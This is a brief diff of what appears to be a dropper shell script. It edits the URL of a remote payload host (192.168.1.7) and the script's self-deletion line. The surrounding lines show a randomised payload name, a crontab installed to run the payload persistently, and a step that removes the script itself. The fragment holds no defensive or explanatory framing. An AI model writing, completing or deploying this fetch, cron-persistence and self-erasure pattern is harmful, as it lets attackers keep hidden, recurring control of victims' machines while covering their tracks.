@@ -9,7 +9,7 @@
 
 # Please remember that if you don't use file extensione, when downloading with curl or wget, problems
 # may occurs. So you need to put and ending slash / to file.
-URL="https://192.168.1.7/macho.sh"
+URL="https://192.168.1.7/macho/"
 
 # Randomize payload name
 PAYLOAD=$RANDOM
@@ -33,4 +33,4 @@ crontab temp_cron
 rm temp_cron
 
 # Remove itself 
-rm macho.sh 2>&1
+rm macho 2>&1
